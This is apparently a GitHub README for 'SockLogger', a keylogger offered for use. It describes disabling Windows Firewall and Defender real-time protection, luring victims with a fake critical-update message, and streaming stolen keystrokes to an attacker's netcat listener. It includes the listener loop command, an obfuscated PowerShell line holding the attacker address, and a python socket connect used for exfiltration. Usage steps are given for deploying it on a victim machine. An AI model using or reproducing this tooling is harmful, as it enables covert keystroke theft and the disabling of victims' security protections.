# SockLogger-
A creative way to evade 'Real time protection' and 'Windows Firewall' on windows, and obtain victim key-strokes by obfuscate keylogger and using 'nc' on remote machine. While trying looking for a way to make a simple keylogger, thought it would be interesting to make an obfuscate keylogger which will executed upon a running .ps1 with a fake message update about critical problems using powershell ofcourse. Started to make a script which will make 3 things, but first it must run as Administrator privilege;
1. Turn off the Windows Firewall Center.
2. enject a malicious DWORD on the registry will will make the real time protection going down upon a reboot.
3. Disable the real time protection.
4. Save keystrokes on the C:\Windows\System32 directory and obtain it using a python to open a server on the victim machine.
5. When the the SockLogger-Obfuscate.pyw gets execute [ Using .pyw for making it run in the background ], it's send the keystrokes of the victim to a remote machine [ Attacker ] on the other side by using the next command for listening in a loop: 'while true; do nc -lvnp [PORT]; done' [ in my case is PORT 8080 ].

![1](https://user-images.githubusercontent.com/90532971/196167464-4af42a03-e099-4c1f-ac87-d8f5b1b7dd4f.png)


# Usage
I made a test on my local windows 10 x64  machine [ VICTIM ] and it works perfectly.
1. git clone the reposotory.
2. cd SockLogger3.
3. open a new terminal, press Ctrl+Shift+R and and terminal will split into two windows.
4. On window number 1 with the help of using a python, open a server to your local machine on the SockLogger folder.
5. On window number 1, use the on-top-command i wrote for a loop over and over.
6. Download the script on the victim machine [ Real time protection 'ON' || Windows Firewall 'ON' ]
7. after run it, wait for powershell window to gone, trytyping something and head over to the attacker machine.
8. On window number 2, you should see the keystrokes you made [ On victim machine ]

![fff](https://user-images.githubusercontent.com/90532971/196167908-15377efc-6201-4da1-a5a9-b2ef8ae23fb3.png)

# Updates
This code is just a test while trying for a ways of not only using obfuscation ways, but also using a creative ways of bypass the windows defender/real time protection. still, i want to make a better code which not only contain a phishing message, but also a one that will actually restart the victim's computer, and when it load's again, the script will make another things reffers to protection and bypassing it. 
<h3>Note: Change Machine IP in the .ps1/pyw script under the lines:</h3>
<pre>
${MAc`H`iNe} = ("{5}{2}{0}{3}{1}{4}"-f '://','.0.0.21','tp','10',':','ht') - .ps1 script
</pre>
<pre>
m.connect(("10.0.0.21", 8080)) - .pyw script
</pre>
in my case, the .ps1 was 10.0.0.21 on port 80, and the listener was on port 8080.<br>
please, if you are having any problems, i would like to know. soon i will make a python script which will execute it all in one code. please notice that the .pyw script {python} saved at 'C:\Users\public directory'
